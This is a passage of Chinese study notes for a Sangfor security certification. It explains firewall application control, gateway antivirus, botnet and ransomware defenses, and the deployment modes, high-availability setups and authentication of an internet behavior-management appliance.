src="https://pic.imgdb.cn/item/66dc1561d9c307b7e9d7c1f5.png"></p><p><img src="https://pic.imgdb.cn/item/66dc1578d9c307b7e9d7e170.png"></p><h4 id="4-1-12-终端安全风险-终端上网安全应用控制技术"><a href="#4-1-12-终端安全风险-终端上网安全应用控制技术" class="headerlink" title="4.1.12 终端安全风险&amp;终端上网安全应用控制技术"></a>4.1.12 终端安全风险&amp;终端上网安全应用控制技术</h4><ol><li>应用控制策略功能</li></ol><ul><li>防火墙做逻辑隔离，过滤数据包（过滤条件包括源目区域、源目IP、目的服务及应用）</li></ul><ol start="2"><li>工作过程</li></ol><ul><li>根据自定义应用控制策略，从上往下依次匹配，并根据策略允许或拒绝，同时创建一个会话</li></ul><p><img src="https://pic.imgdb.cn/item/66dc0946d9c307b7e9c3ffaa.png"></p><ol start="3"><li><p>应用控制策略分类</p><ol><li><p>基于服务的控制策略</p><ul><li>通过匹配<strong>数据包五元组</strong>来进行过滤动作</li></ul></li><li><p>基于应用的控制策略</p><ul><li><p>通过匹配<strong>数据包特性</strong>来进行过滤动作，需要一定数量的包通过后才能判断应用类型，然后拦截动作的判断</p></li><li><p>配置应用控制策略，必须服务和应用两类型都匹配，策略才生效，例如：服务是TCP，应用是DNS（UDP），那么就不生效</p></li></ul></li></ol></li><li><p>应用场景</p></li></ol><p><img src="https://pic.imgdb.cn/item/66dc0c8bd9c307b7e9c98d3b.png"></p><p>策略表</p><table><thead><tr><th align="center">策略</th><th align="center">源</th><th align="center">目的</th><th align="center">应用</th><th align="center">动作</th></tr></thead><tbody><tr><td align="center">1、允许ip访问服务器固定端口80</td><td align="center">172.16.10.10</td><td align="center">172.16.20.20:80</td><td align="center">any</td><td align="center">允许</td></tr><tr><td align="center">2、禁止访问P2P相关应用</td><td align="center">172.16.10.10</td><td align="center">any</td><td align="center">P2P</td><td align="center">拒绝</td></tr><tr><td align="center">3、PC允许访问互联网（加时间计划）</td><td align="center">172.16.10.10</td><td align="center">any</td><td align="center">any</td><td align="center">允许</td></tr></tbody></table><ol start="5"><li>应用控制策略–长连接</li></ol><p>​       在一些特殊的环境下，实现服务器在一段时间中没有收到客户端的数据(应用层数据)，也不会断开连接，这就</p><p>需要AF配置长连接，防止会话超时删除。</p><p><img src="https://pic.imgdb.cn/item/66dc1083d9c307b7e9d24039.png"></p><p>应用场景：</p><p><img src="https://pic.imgdb.cn/item/66dc1134d9c307b7e9d2cbce.png"></p><ol start="6"><li>应用控制策略辅助功能</li></ol><p><img src="https://pic.imgdb.cn/item/66dc11a4d9c307b7e9d33d8d.png"></p><p>应用场景：</p><p><img src="https://pic.imgdb.cn/item/66dc13d6d9c307b7e9d5a5ef.png"></p><p>配置案例：</p><p><img src="https://pic.imgdb.cn/item/66dc1422d9c307b7e9d60d08.png"><img src="https://pic.imgdb.cn/item/66dc1433d9c307b7e9d62450.png"></p><ol start="7"><li>注意事项</li></ol><p><img src="https://pic.imgdb.cn/item/66dc1487d9c307b7e9d69c66.png"></p><h4 id="4-1-13-终端上网安全网关杀毒技术"><a href="#4-1-13-终端上网安全网关杀毒技术" class="headerlink" title="4.1.13 终端上网安全网关杀毒技术"></a>4.1.13 终端上网安全网关杀毒技术</h4><ol><li><p>网关杀毒功能优势：</p><ol><li>基于应用层过滤病毒</li><li>过滤出入网关数据</li><li>网关阻断病毒传输，主动防御病毒于网络之外</li><li>部署简单，方便管理，维护成本低</li><li>与杀毒软件联动，建立多层防护</li></ol></li><li><p>实现方法</p><ol><li><p>代理扫描</p><ul><li>将所有经过网关的需要进行病毒检测的数据报文透明的转交给网关自身的协议栈，通过网关自身的协议栈将文件全部缓存下来后，再送入<strong>病毒检测引擎</strong>进行病毒检测。</li></ul></li><li><p>流扫描</p><ul><li>依赖于<strong>状态检测技术</strong>以及<strong>协议解析技术</strong>，简单的提取文件的特征与本地签名库进行匹配。</li></ul></li></ol></li></ol><p><img src="https://pic.imgdb.cn/item/66dc17ded9c307b7e9dc7b6f.png"></p><ol start="3"><li><p>杀毒优势</p><ol><li>支持各类主流协议文件传播杀毒，包括SMB v1/v2/v3协议，通过采用SAVE智能文件检测引擎(杀毒)，大幅提高恶意文件识别率</li><li>支持对邮件正文中的恶意域名、URL进行检测</li><li>提供覆盖更广的杀毒能力，支持文档类、脚本类的非PE文件检查、office宏病毒的杀毒功能</li><li>杀毒文件的大小限制可以灵活调整，界面可调整的大小限制为1-20M</li><li>支持对压缩文件的检测，且可设置层级，界面可调整的层级最多16层</li></ol></li><li><p>SAVE引擎优势</p><ol><li>基于AI技术提取稳定可靠的高层次特征，拥有强大的泛化能力，能够识别未知病毒或者已知病毒的新变种;</li><li>对勒索病毒检测效果达到业界领先，影响广泛的如WannaCry、BadRabbit、Globelmposter等勒索病毒，save均有检出新变种的案例。同时，对非勒索病毒也有较好的检出效果;</li><li>轻量级，资源占用少，隔离网环境检测能力业界领先;</li><li>云+边界设备+端联动，依托于深信服安全云脑海量的安全数据，SAVE能够持续进化，不断更新模型并提升检测能力，未知威胁能够在云端分钟级返回检测结果并全网同步，构成了深信服的安全云脑+安全网关AF/SIP/AC+终端安全EDR的整体解决方案。</li></ol></li><li><p>应用场景</p></li></ol><p><img src="https://pic.imgdb.cn/item/66dc1a7dd9c307b7e9e15d68.png"></p><p>配置思路：</p><p><img src="https://pic.imgdb.cn/item/66dc1b6bd9c307b7e9e34671.png">配置案例：</p><p><img src="https://pic.imgdb.cn/item/66dc1c40d9c307b7e9e4c630.png"></p><ol start="6"><li>注意事项</li></ol><p><img src="https://pic.imgdb.cn/item/66dc1de4d9c307b7e9e84191.png"></p><p><img src="https://pic.imgdb.cn/item/66dc1e68d9c307b7e9e8b461.png"></p><h4 id="4-1-14-僵尸网络检测和防御技术"><a href="#4-1-14-僵尸网络检测和防御技术" class="headerlink" title="4.1.14 僵尸网络检测和防御技术"></a>4.1.14 僵尸网络检测和防御技术</h4><ol><li>僵尸网络</li></ol><p>​        僵尸网络(Botnet，亦译为丧尸网络、机器人网络)是指骇客利用自己编写的分布式拒绝服务攻击程序将数万个沦陷的机器，即黑客常说的僵尸电脑或肉鸡组织成一个个控制节点用来发送伪造包或者是垃圾数据包，使预定攻击目标瘫痪并“拒绝服务”。通常蠕虫病毒也可以被利用组成僵尸网络</p><ol start="2"><li><p>防御技术思路</p><ol><li>需要一种事后检测机制用于发现和定位客户端受感染的机器，以降低客户端安全风险。同时记录的日志要求有较高的可追溯性。</li><li>感染了病毒、木马的机器，其病毒、木马试图与外部网络通信时，AF识别出该流量，并根据用户策略进行阻断和记录日志。</li></ol></li><li><p>防御技术</p><ol><li><strong>木马远控</strong>：对防护区域发出的数据及收到的请求数据都进行木马远控安全检测</li><li><strong>异常流量</strong>：包含非标准端口运行对应协议检测（**<u>例如22端口运行非ssh协议</u>**），反弹检测，启发式的dos攻击检测等手段</li></ol></li><li><p>异常流量检测</p><ol><li>通过对当前的网络层及应用层行为与安全模型进行偏离度分析，能够发现隐藏的网络异常行为，并根据行为特征确定攻击类型，发现特征匹配无法发现的攻击</li><li>外发流量异常功能是一种启发式的dos攻击检测手段，能够检测源IP不变的<strong>syn flood、icmp flood、dns flood与udp flood</strong>攻击。</li><li>外发流量异常功能的原理为:当特定协议的外发包pps超过配置的阈值时，基于5分钟左右的抓包样本检测数据包是否为单向流量、是否有正常响应内容，得出分析结论，并将发现的攻击提交日志显示。</li></ol></li><li><p>其他检测方法</p><ol><li>与僵尸网络连接是最基础的判定方式，信息来源包括:上万台在线设备收集、与google等机构合作共享</li><li>对于未知的僵尸网络(存在大量DGA生成的C&amp;C域名)，通过模拟DGA算法总结特征/总结一般正常域名的构成方式来判定未知的僵尸网络</li><li>危险的外联方式检测，如使用已知的(IRC、HFS)与僵尸网络进行通讯</li><li>使用标准端口传输非标准协议(如:在80端口中传输RDP协议)</li><li>对外发起CC攻击</li><li>对外传播恶意文件</li><li>对外发送shellcode</li><li>检测出下载恶意文件、恶意PDF等行为</li><li>检测出下载文件与后缀名不符</li><li>上下行流量不符</li></ol></li><li><p>配置思路</p></li></ol><p><img src="https://pic.imgdb.cn/item/66dc601dd9c307b7e957980b.png"></p><ol start="7"><li>配置案例</li></ol><p><img src="https://pic.imgdb.cn/item/66dc610fd9c307b7e958f870.png"></p><ol start="8"><li>误判处理方式</li></ol><p><img src="https://pic.imgdb.cn/item/66dc6183d9c307b7e959a336.png"></p><p><img src="https://pic.imgdb.cn/item/66dc61e6d9c307b7e95a2f50.png"></p><ol start="9"><li>恶意域名重定向</li></ol><ul><li>通过蜜罐技术解决内网存在DNS服务器时，用于定位内网感染僵尸网络主机的真实IP地址。</li><li>防止配置过程中忽略蜜罐设置，导致后续无法溯源的问题，策略配置界面新增DNS服务器服务界面。</li></ul><h4 id="4-1-15-终端安全防护专题-勒索病毒防护"><a href="#4-1-15-终端安全防护专题-勒索病毒防护" class="headerlink" title="4.1.15 终端安全防护专题-勒索病毒防护"></a>4.1.15 终端安全防护专题-勒索病毒防护</h4><ol><li>勒索攻击感染过程分析</li></ol><p>​首先，黑客通过SMB、RDP等口令暴力破解、勒索常用端口利用、以及服务器漏洞等的利用想方设法让勒索病毒感染用户主机(感染主机)<br>​当主机感染了勒索病毒文件之后，会在主机上运行勒索程序，同时黑客也会尝试利用SMB、RDP手动进行横向传播，感染更多的主机(横向扩散)<br>​接着，当勒索程序在一台或者多台主机上被运行后，勒索病毒会遍历本地所有磁盘，对指定类型的文件进行加密，加密后的文件无法再被读取(加密文件)<br>​生成勒索通知文件，告知受害者这台机器已经中了勒索病毒了，并要求受害者在规定时间内支付一定价值的比特币才能恢复数据，否则数据会被销毁(生成勒索通知勒索用户)<br>​加密后数据正常无法自己解密，因为勒索采用的是高强度非对称加密方式，受害者在没有私钥情况下无法恢复文件(交赎金恢复数据文件)</p><ol start="2"><li>感染过程流程示例</li></ol><p><img src="https://pic.imgdb.cn/item/66dc6598d9c307b7e95f8e8c.png"></p><ol start="3"><li><p>勒索病毒防护</p><ol><li><p>事前防御</p><ul><li>勒索常用端口主动扫描</li><li>服务器高危漏洞主动扫描</li><li>**<u>RDP/VNC/SSH/SMB</u>**服务弱口令主动扫描</li></ul></li><li><p>事中对抗</p><ul><li>自动生成全面勒索防护的安全策略</li><li>不需再手动单独配置多类防护策略</li></ul></li><li><p>事后响应</p><ul><li>联动EDR查杀</li><li>勒索事件可视易懂</li><li>一键隔离失陷资产</li></ul></li></ol></li><li><p>功能介绍</p><ol><li><p>事前防御</p><ul><li><p>梳理资产暴露面，屏蔽勒索入侵进入点，对勒索常用端口、勒索常用漏洞、弱口令做事前的识别，并给出处理建议</p><p>  <img src="https://pic.imgdb.cn/item/66dc6987d9c307b7e96528e2.png"></p></li></ul></li><li><p>事中对抗</p><ul><li>勒索专项防护策略自动生成，全面防护勒索黑客攻击。通过安全策略深度检测入侵手段对抗隐蔽勒索攻击，通过自动生成web应用防护、漏洞防护、内容安全、慢速爆破检测的全面防护策略对勒索病毒做全面入侵防御</li></ul></li><li><p>事后响应</p><ul><li><p>联动EDR查杀，隔离失陷资产，快速处置勒索风险，勒索事件可视、易分析</p><p>  <img src="https://pic.imgdb.cn/item/66dc6b83d9c307b7e9696a30.png"></p></li></ul></li></ol></li><li><p>配置思路</p></li></ol><p><img src="https://pic.imgdb.cn/item/66dc6c0dd9c307b7e96b0438.png"></p><ol start="6"><li>配置勒索防护配置</li></ol><ul><li>勒索专项防护的主动扫描，目前仅支持对RDP/VNC/SSH/SMB服务的弱口令扫描并分析受保护的服务器是否存在已知漏洞</li><li>支持SMB慢速爆破、分布式慢速爆破检测，支持RDP慢速爆破检测;</li><li>可支持将SMB/RDP慢速爆破的日志同步到SIP平台</li></ul><h4 id="4-1-16-服务器安全风险与DOS攻击检测和防御技术"><a href="#4-1-16-服务器安全风险与DOS攻击检测和防御技术" class="headerlink" title="4.1.16 服务器安全风险与DOS攻击检测和防御技术"></a>4.1.16 服务器安全风险与DOS攻击检测和防御技术</h4><h4 id="4-1-17-漏洞攻击防护入侵检测和防御技术"><a href="#4-1-17-漏洞攻击防护入侵检测和防御技术" class="headerlink" title="4.1.17 漏洞攻击防护入侵检测和防御技术"></a>4.1.17 漏洞攻击防护入侵检测和防御技术</h4><h4 id="4-1-18-WEB攻击检测和防御技术"><a href="#4-1-18-WEB攻击检测和防御技术" class="headerlink" title="4.1.18 WEB攻击检测和防御技术"></a>4.1.18 WEB攻击检测和防御技术</h4><h4 id="4-1-19-联动封锁技术"><a href="#4-1-19-联动封锁技术" class="headerlink" title="4.1.19 联动封锁技术"></a>4.1.19 联动封锁技术</h4><h4 id="4-1-20-安全运营中心"><a href="#4-1-20-安全运营中心" class="headerlink" title="4.1.20 安全运营中心"></a>4.1.20 安全运营中心</h4><h4 id="4-1-21-业务安全功能"><a href="#4-1-21-业务安全功能" class="headerlink" title="4.1.21 业务安全功能"></a>4.1.21 业务安全功能</h4><h4 id="4-1-22-用户安全功能"><a href="#4-1-22-用户安全功能" class="headerlink" title="4.1.22 用户安全功能"></a>4.1.22 用户安全功能</h4><h4 id="4-1-23-业务资产管理"><a href="#4-1-23-业务资产管理" class="headerlink" title="4.1.23 业务资产管理"></a>4.1.23 业务资产管理</h4><h4 id="4-1-24-主动诱捕（云蜜罐）"><a href="#4-1-24-主动诱捕（云蜜罐）" class="headerlink" title="4.1.24 主动诱捕（云蜜罐）"></a>4.1.24 主动诱捕（云蜜罐）</h4><h4 id="4-1-25-账号安全检测和防御技术"><a href="#4-1-25-账号安全检测和防御技术" class="headerlink" title="4.1.25 账号安全检测和防御技术"></a>4.1.25 账号安全检测和防御技术</h4><h4 id="4-1-26-DNS-Mapping功能与设备常用运维功能"><a href="#4-1-26-DNS-Mapping功能与设备常用运维功能" class="headerlink" title="4.1.26 DNS-Mapping功能与设备常用运维功能"></a>4.1.26 DNS-Mapping功能与设备常用运维功能</h4><h4 id="4-1-27-xhack工具介绍"><a href="#4-1-27-xhack工具介绍" class="headerlink" title="4.1.27 xhack工具介绍"></a>4.1.27 xhack工具介绍</h4><h3 id="第二部分-全网行为管理基础原理与运维"><a href="#第二部分-全网行为管理基础原理与运维" class="headerlink" title="第二部分 全网行为管理基础原理与运维"></a>第二部分 全网行为管理基础原理与运维</h3><h4 id="4-2-1-全网行为管理概述"><a href="#4-2-1-全网行为管理概述" class="headerlink" title="4.2.1 全网行为管理概述"></a>4.2.1 全网行为管理概述</h4><blockquote><p>AC：全网行为管理BA：行为感知系统</p></blockquote><ol><li>需求背景</li></ol><p>企业运维各环节中存在的风险</p><ul><li>资产管理混乱</li><li>终端违规接入</li><li>入网行为不规范</li><li>上网缺乏管控</li><li>数据泄密风险</li><li>事后溯源困难</li></ul><ol start="2"><li>核心价值</li></ol><p>​内部风险智能感知，全网行为<strong>可视可控</strong>：通过全网终端、应用、流量和数据的可视可控，智能感知终端违规接入、敏感数据泄密、上网违规行为等内部风险，解决上网管控、终端准入管控和数据泄密管控的一体化管控。</p><ol start="3"><li>应用场景</li></ol><ul><li>场景维度</li></ul><img src="https://pic.imgdb.cn/item/6729d99ad29ded1a8ca1ea64.png" style="zoom:50%;"><ul><li>上网行为管控</li></ul><img src="https://pic.imgdb.cn/item/6729da36d29ded1a8ca25e1a.png" style="zoom:67%;"><ul><li>终端准入管控</li></ul><p><img src="https://pic.imgdb.cn/item/6729da89d29ded1a8ca293f6.png"></p><ul><li>多分支组网</li></ul><p><img src="https://pic.imgdb.cn/item/6729db3cd29ded1a8ca31867.png"></p><ul><li>数据价值分析</li></ul><p><img src="https://pic.imgdb.cn/item/6729dc07d29ded1a8ca3a1d4.png"></p><h4 id="4-2-2-全网行为管理的基本操作"><a href="#4-2-2-全网行为管理的基本操作" class="headerlink" title="4.2.2 全网行为管理的基本操作"></a>4.2.2 全网行为管理的基本操作</h4><h5 id="1-登陆设备"><a href="#1-登陆设备" class="headerlink" title="1. 登陆设备"></a>1. 登陆设备</h5><p><img src="https://pic.imgdb.cn/item/6731bf5dd29ded1a8c53f45c.png"></p><p><img src="https://pic.imgdb.cn/item/6731c035d29ded1a8c5508d2.png"></p><p><img src="https://pic.imgdb.cn/item/6731c11dd29ded1a8c562ebe.png"></p><h5 id="2-恢复出厂设置"><a href="#2-恢复出厂设置" class="headerlink" title="2.恢复出厂设置"></a>2.恢复出厂设置</h5><p>交叉线路短接设备两个电口恢复</p><p><img src="https://pic.imgdb.cn/item/67331a99d29ded1a8c608e46.png"></p><p>U盘恢复出厂设置</p><p><img src="https://pic.imgdb.cn/item/67331ad3d29ded1a8c60cde5.png"></p><p>设备基本操作总结：</p><p><img src="https://pic.imgdb.cn/item/67331c8ed29ded1a8c62a1be.png"></p><h6 id="错题"><a href="#错题" class="headerlink" title="错题"></a>错题</h6><p><img src="https://pic.imgdb.cn/item/673ea3f5d29ded1a8c8ed46b.png"></p><p><img src="https://pic.imgdb.cn/item/673ea433d29ded1a8c8f5a00.png"></p><h4 id="4-2-3-全网行为管理部署模式"><a href="#4-2-3-全网行为管理部署模式" class="headerlink" title="4.2.3 全网行为管理部署模式"></a>4.2.3 全网行为管理部署模式</h4><blockquote><p>部署模式：部署模式是指设备以什么样的工作方式部署到客户网络中去，不同的部署模式对客户原有网络的影响各有不同:设备在不同模式下支持的功能也各不一样，设备以何种方式部署需要综合用户具体的网络环境<br>和功能需求而定。</p><p>根据客户需求及环境不同分为：</p><ul><li>AC设备支持路由、网桥、旁路部署模式</li><li>SG设备支持路由、网桥、旁路、单臂部署模式</li><li>12.0版本之后支持认证部署模式，</li><li>13.0版本之后认证模式功能以认证口的形式融入到普通模式中</li></ul></blockquote><h5 id="路由部署解决方案"><a href="#路由部署解决方案" class="headerlink" title="路由部署解决方案"></a>路由部署解决方案</h5><ol><li>简介</li></ol><p>​设备以路由模式部署时，AC的工作方式<strong>与路由器相当</strong>，具备基本的路由转发及NAT功能。一般在客户还没有相应的网关设备或者用户的网络环境规模比较小，需要将AC做网关使用时，建议以路由模式部署。</p><p>​路由模式下支持AC所有的功能</p><p>​如果需要使用NAT、VPN、DHCP等功能时AC<strong>必须以路由模式部署</strong>，其它工作模式没有这些功能。</p><img src="https://pic.imgdb.cn/item/67331f29d29ded1a8c65430b.png" style="zoom:50%;"><ol start="2"><li>配置思路</li></ol><p>（1）网口配置:配置各网口地址。如果是固定IP，则填写运营商给的IP地址及网关:如果是ADSL拨号上网，则填写运营商给的拨号帐号和密码;确定内网口的IP;<br>（2）确定内网是否为多网段网络环境，如果是的话需要添加相应的回包路由，将到内网各网段的数据回指给设备下接的三层设备。<br>（3）用户是否需要通过AC设备上网，如果是的话，需要设置NAT规则。<br>（4）检查并放通防火墙规则。</p><h5 id="网桥部署解决方案"><a href="#网桥部署解决方案" class="headerlink" title="网桥部署解决方案"></a>网桥部署解决方案</h5><ol><li>简介</li></ol><p>​设备以网桥模式部署时<strong>对客户原有的网络基本没有改动</strong>。网桥模式部署AC时，对客户来说AC就是个透明的设备，如果因为AC自身的原因而导致网络中断时可以开启硬件bypass功能，即可恢复网络通信。</p><p>​网桥模式部署时AC<strong>不支持</strong>NAT(代理上网和端口映射)、VPN、DHCP等功能。</p><p><img src="https://pic.imgdb.cn/item/67332120d29ded1a8c679590.png"></p><ol start="2"><li>配置思路</li></ol><p>（1）配置设备网桥地址，网关地址，DNS地址。<br>（2）确定内网是否为多网段网络环境，本案例就是三层环境，所以需要添加相应的回包路由，将到内网各网段的数据回指给设备下接的三层设备。<br>（3）检查并放通防火墙规则、</p><h5 id="旁路部署解决方案"><a href="#旁路部署解决方案" class="headerlink" title="旁路部署解决方案"></a>旁路部署解决方案</h5><ol><li>简介</li></ol><p>​旁路模式主要用于实现<strong>行为审计功能</strong>，不需要改变用户的网络环境通过把设备的监听口接在交换机的镜像口上同时镜像交换机上下行的数据，从而实现对上网数据的监控与控制。这种模式对用户的网络环境没有影响，即使设备本身宕机也不会对用户的网络造成中断。</p><p>​旁路模式部署还可用于<strong>旁路重定向认证</strong>，在不改变网络原有架构的情况下对入网用户进行认证。</p><p>​更多场景:旁路portal重定向认证+审计场景、旁路802.1X认证+基线核查+审计场景。</p><p>​注意:旁路部署模式<strong>只能对TCP应用做控制</strong>，对基于UDP的应用无法控制。不支持流量管理、NAT、VPN、 DHCP等功能。因为TCP是有连接的，UDP是无连接的，无法关闭应用传输</p><blockquote><p>TCP RST:标示复位、用来异常的关闭连接</p><p>1.发送RST包关闭连接时，不必等缓冲区的包都发出去，直接就丢弃缓冲区中的包。<br>2.而接收端收到RST包后，也不必发送ACK包来确认</p></blockquote><ol start="2"><li>配置思路</li></ol><p>（1）交换机设置镜像口，并接到AC监听口。<br>（2）配置需要审计的内网网段和服务器网段。<br>（3）配置管理口地址，用于管理AC设备。</p><h5 id="部署模式小结"><a href="#部署模式小结" class="headerlink" title="部署模式小结"></a>部署模式小结</h5><ul><li>路由模式可以<strong>实现设备所有功能</strong>，网桥模式其次，旁路模式多用于审计，只能对TCP应用控制，控制功能最弱。</li><li>路由模式<strong>对客户原有网络改造影响最大</strong>，网桥模式其次，旁路模式对客户原有网络改造无影响，即使设备宕机也不会影响客户断网。</li><li>设备路由模式最多支持8条外网线路。网桥模式最多支持8对网桥，旁路模式除了管理口外，其它网口均可作为监听口，可以同时选择多个网口作为监听口。</li></ul><h5 id="Trunk部署解决方案"><a href="#Trunk部署解决方案" class="headerlink" title="Trunk部署解决方案"></a>Trunk部署解决方案</h5><ol><li>Trunk环境路由配置</li></ol><p>（1）AC路由模式部署直接替代原有的路由器(或FW)，并按照路由模式部署配置好设备。<br>（2）配置LAN口IP，填写内网对应VLAN的VLAN网关IP即可</p><ol start="2"><li>Trunk环境网桥配置</li></ol><img src="https://pic.imgdb.cn/item/673345fbd29ded1a8c8c030a.png" style="zoom:50%;"><p>（1）网桥模式部署在路由器与交换机之间，按网桥模式部署配置好设备<br>（2）可以给设备网桥配置其中一个VLAN中的可用IP来进行管理和更新规则库<br>（3）或者给设备管理口配置其中一个VLAN中的可用IP(此时不用加vid)来进行管理和更新规则库</p><h6 id="错题-1"><a href="#错题-1" class="headerlink" title="错题"></a>错题</h6><img src="https://pic.imgdb.cn/item/673ea697d29ded1a8c93fced.png" style="zoom: 67%;"><h4 id="4-2-4-全网行为管理高可用部署"><a href="#4-2-4-全网行为管理高可用部署" class="headerlink" title="4.2.4 全网行为管理高可用部署"></a>4.2.4 全网行为管理高可用部署</h4><h5 id="1-高可用需求背景"><a href="#1-高可用需求背景" class="headerlink" title="1 高可用需求背景"></a>1 高可用需求背景</h5><ol><li>需求背景</li></ol><ul><li><p>随着网络的快速普及和应用的日益深入，各种增值业务在网络上得到了广泛部署，网络带宽也以指数级增长，网络短时间的中断就可能影响大量业务，造成重大损失</p></li><li><p>作为业务承载主体的基础网络，其高可用性(HighAvailablity，HA)也因此日益成为关注的焦点</p></li><li><p>高可用性的设计理念我们在日常生活中随处可见</p><p>  例如:机房供电分为市电供电以及UPS电源，通过UPS电源来应对突发的停电情况。</p></li></ul><blockquote><p>衡量网络可用性的标准：</p><ul><li>故障少</li><li>平均维修时间MTTR</li><li>恢复快</li><li>平均无故障时间MTTF</li></ul></blockquote><ol start="2"><li>高可用部署类型</li></ol><p><img src="https://pic.imgdb.cn/item/673347bcd29ded1a8c8d9c35.png"></p><ol start="3"><li>各部署模式对高可用支持情况</li></ol><p><img src="https://pic.imgdb.cn/item/6733486dd29ded1a8c8e3d43.png"></p><h5 id="2-主备模式部署"><a href="#2-主备模式部署" class="headerlink" title="2 主备模式部署"></a>2 主备模式部署</h5><ol><li>介绍</li></ol><p>​主备模式是指<strong>路由模式部署</strong>的两台设备通过心跳检测，实现热备份(保持心跳和配置同步)。正常情况下，只有主设备工作如果主设备故障，则自动切换到备设备，备设备接替主设备工作。从而保证客户的业务不受影响，网络不中断。<br>​主备模式只有一台主设备处于正常工作状态，另一台备设备处于监听状态。</p><p>​适用场景：AC路由模式部署在网络出口且稳定性要求较高的客户环境。</p><p><strong><u>注意：网桥模式不支持配置为主备模式！</u></strong></p><img src="https://pic.imgdb.cn/item/67334abdd29ded1a8c90ecc1.png" style="zoom:50%;"><ol start="2"><li>条件</li></ol><ul><li>主备设备软件版本必须一致，包括R版本、KB和定制等信息也需要一致</li><li>硬件型号尽量选择相近型号，避免负载差别太大切换出现断网</li><li>设备本身的硬件网口数量(需要区分干兆还是万兆，电口还是光口)需要一致。</li><li>两台设备必须路由模式部署，LAN/WAN/DMZ口与ethx的对应关系要一致。</li><li>设备授权信息需一致。</li></ul><ol start="3"><li>配置思路</li></ol><p>（1）主机网络配置，配置设备部署模式为路由模式，并根据网络规划配置接口IP地址等信息。</p><p>（2）主机高可用配置</p><img src="https://pic.imgdb.cn/item/67334fc8d29ded1a8c94f032.png" style="zoom:50%;"><img src="https://pic.imgdb.cn/item/67334ffbd29ded1a8c95152b.png" style="zoom: 67%;"><p>HA口：心跳口</p><p><img src="https://pic.imgdb.cn/item/6734adb0d29ded1a8ca87499.png"></p><p><img src="https://pic.imgdb.cn/item/6734ade9d29ded1a8ca89eb1.png"></p><p><img src="https://pic.imgdb.cn/item/6734ae52d29ded1a8ca8fb99.png"></p><ol start="4"><li>主备部署设备上架顺序：</li></ol><ul><li>主机和备机上架并固定(通过耳片，托盘或导轨固定)</li><li>按照规划拓扑接线。</li><li>主机先加电开机，等待主机成功启动后(alarm灯熄灭，控制台可以正常登录则成功启动)，备机加电开机。</li><li>观察主机和备机的Ha灯的状态，正常应该是主机Ha灯常亮，备机Ha灯有规律的闪烁。</li></ul><img src="https://pic.imgdb.cn/item/6734b3d7d29ded1a8cae3fb3.png" style="zoom:67%;"><h5 id="3-主主模式部署"><a href="#3-主主模式部署" class="headerlink" title="3 主主模式部署"></a>3 主主模式部署</h5><ol><li>介绍</li></ol><p>​主主模式部署由<strong>多台AC</strong>设备通过通信网口同步配置。主主模式部署的设备同时工作，主控设备将配置同步到所有节点主控与各节点之间相互同步会话信息。当主控故障，将无法更改设备配置。</p><p>​适用环境:客户原有网络中有多台交换机，交换机为堆叠部署/链路聚合、防火墙/路由器主主或主备部署时，AC以网桥串接在中间，建议使用主主模式部署。</p><img src="https://pic.imgdb.cn/item/6734b4cdd29ded1a8caf393d.png" style="zoom:50%;"><ol start="2"><li>部署条件</li></ol><ul><li>主备设备软件版本必须一致，包括R版本、KB和定制等信息也需要一致</li><li>AC设备型号不要求完全一样，但是硬件网口数量必须一致</li><li>设备授权信息必须一致</li></ul><ol start="3"><li>配置同步情况</li></ol><ul><li>不同步的配置：</li></ul><p><strong>网关模式、网口配置、数据中心配置、数据中心审计日志，病毒库等</strong></p><ul><li>自动同步的配置：</li></ul><p>上网策略、在线用户状态、应用识别规则库、URL库、管理员账户、全局排除等</p><p>注意：节点不能修改配置只能由主控同步，界面限制只读</p><ol start="4"><li>主主部署配置案例</li></ol><p><img src="https://pic.imgdb.cn/item/673812c9d29ded1a8c4ce0e4.png"></p><ol start="5"><li>配置思路</li></ol><p><img src="https://pic.imgdb.cn/item/67381488d29ded1a8c4e0d6a.png"></p><p><img src="https://pic.imgdb.cn/item/673814b0d29ded1a8c4e27ad.png"></p><p><img src="https://pic.imgdb.cn/item/673814c9d29ded1a8c4e375b.png"></p><ol start="6"><li>配置效果</li></ol><p><img src="https://pic.imgdb.cn/item/6738153fd29ded1a8c4e8884.png"></p><ol start="7"><li>问题思考</li></ol><p><img src="https://pic.imgdb.cn/item/6738159cd29ded1a8c4ec43f.png"></p><h6 id="错题-2"><a href="#错题-2" class="headerlink" title="错题"></a>错题</h6><p><img src="https://pic.imgdb.cn/item/673ea7a5d29ded1a8c95b27d.png"></p><h4 id="4-2-5-接入认证基础"><a href="#4-2-5-接入认证基础" class="headerlink" title="4.2.5 接入认证基础"></a>4.2.5 接入认证基础</h4><ol><li>案例背景</li></ol><p>要求实现：</p><ul><li>IT部电脑IP不固定，认证不受限制</li><li>办公区用户不能修改IP地址上网</li><li>公共上网区则需要输入账号和密码才能上网，确保网络行为能跟踪到，</li></ul><ol start="2"><li>认证框架</li></ol><img src="https://pic.imgdb.cn/item/67383ca4d29ded1a8c6d1b8a.png" style="zoom: 67%;"><h5 id="无认证技术"><a href="#无认证技术" class="headerlink" title="无认证技术"></a>无认证技术</h5><ol><li>需求背景</li></ol><p>需求一：IT部电脑IP不固定，认证不受限制IT部电脑IP不固定，认证不受限制</p><ol start="2"><li>数据包特征信息</li></ol><img src="https://pic.imgdb.cn/item/67383db3d29ded1a8c6dd66a.png" style="zoom:67%;"><ol start="3"><li>配置思路</li></ol><img src="https://pic.imgdb.cn/item/67383deed29ded1a8c6e01f9.png" style="zoom:67%;"><ol start="4"><li>效果展示</li></ol><p><img src="https://pic.imgdb.cn/item/67383e2bd29ded1a8c6e339a.png"></p><h5 id="IP-MAC认证"><a href="#IP-MAC认证" class="headerlink" title="IP/MAC认证"></a>IP/MAC认证</h5><ol><li>需求背景</li></ol><p>需求二：办公区用户不能修改IP地址，否则禁止上网</p><p>需求分析：源MAC地址经过二层交换机是不会改变的，但是经过三层交换机或者路由器则会改变，所以如何获取终端真实的IP/MAC表项呢？</p><h6 id="SNMP协议"><a href="#SNMP协议" class="headerlink" title="SNMP协议"></a>SNMP协议</h6><p>SNMP是基于TCP/IP协议族的网络管理标准，是一种在IP网络中<strong>管理网络节点</strong>(如服务器、工作站、路由器、交换机等)的标准协议。</p><img src="https://pic.imgdb.cn/item/6738408bd29ded1a8c701b03.png" 